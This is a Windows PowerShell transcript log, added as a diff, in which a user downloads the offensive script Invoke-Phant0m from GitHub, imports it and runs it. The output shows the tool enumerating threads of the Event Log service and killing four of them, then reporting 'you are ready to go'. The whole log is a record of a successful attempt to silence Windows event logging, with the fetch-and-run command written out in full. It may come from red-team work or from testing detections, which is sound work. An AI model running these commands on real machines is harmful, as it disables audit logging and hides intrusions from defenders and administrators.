@@ -1,0 +1,105 @@
+﻿**********************
+Windows PowerShell 脚本开始
+开始时间: 20230411160928
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
+$url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
+$output = "$env:TEMP\Invoke-Phant0m.ps1"
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $output)
+cd $env:TEMP
+Import-Module .\Invoke-Phant0m.ps1
+Invoke-Phant0m}
+进程 ID: 17984
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>. 'C:\Users\wangjian\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1'
+PS>& {Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
+$url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
+$output = "$env:TEMP\Invoke-Phant0m.ps1"
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $output)
+cd $env:TEMP
+Import-Module .\Invoke-Phant0m.ps1
+Invoke-Phant0m}
+
+        _                 _    ___
+  _ __ | |__   __ _ _ __ | |_ / _ \ _ __ ___
+ | '_ \| '_ \ / _` | '_ \| __| | | | '_ ` _ \
+ | |_) | | | | (_| | | | | |_| |_| | | | | | |
+ | .__/|_| |_|\__,_|_| |_|\__|\___/|_| |_| |_|
+ |_|
+
+[!] I'm here to blur the line between life and death...
+
+[*] Enumerating threads of PID: 2020...
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230411161015
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
+$url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
+$output = "$env:TEMP\Invoke-Phant0m.ps1"
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $output)
+cd $env:TEMP
+Import-Module .\Invoke-Phant0m.ps1
+Invoke-Phant0m}
+进程 ID: 17984
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“Unable to open handle for thread 7344.”
+Trace-Thread : Unable to open handle for thread 7344.
+所在位置 C:\Users\wangjian\AppData\Local\Temp\Invoke-Phant0m.ps1:1028 字符: 62
++ ...  -Process { Trace-Thread -ProcessHandle $ProcessHandle -ThreadId $_.I ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
+    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Trace-Thread
+Trace-Thread : Unable to open handle for thread 7344.
+所在位置 C:\Users\wangjian\AppData\Local\Temp\Invoke-Phant0m.ps1:1028 字符: 62
++ ...  -Process { Trace-Thread -ProcessHandle $ProcessHandle -ThreadId $_.I ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
+    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Trace-Thread
+Trace-Thread : Unable to open handle for thread 7344.
+所在位置 C:\Users\wangjian\AppData\Local\Temp\Invoke-Phant0m.ps1:1028 字符: 62
++ ...  -Process { Trace-Thread -ProcessHandle $ProcessHandle -ThreadId $_.I ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
+    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Trace-Thread
+
+[*] Parsing Event Log Service Threads...
+[+] Thread 2384 Succesfully Killed!
+[+] Thread 9836 Succesfully Killed!
+[+] Thread 18056 Succesfully Killed!
+[+] Thread 8364 Succesfully Killed!
+
+[+] All done, you are ready to go!
+
+PS>$global:?
+True
+**********************
+Windows PowerShell 脚本结束
+结束时间: 20230411161015
+**********************
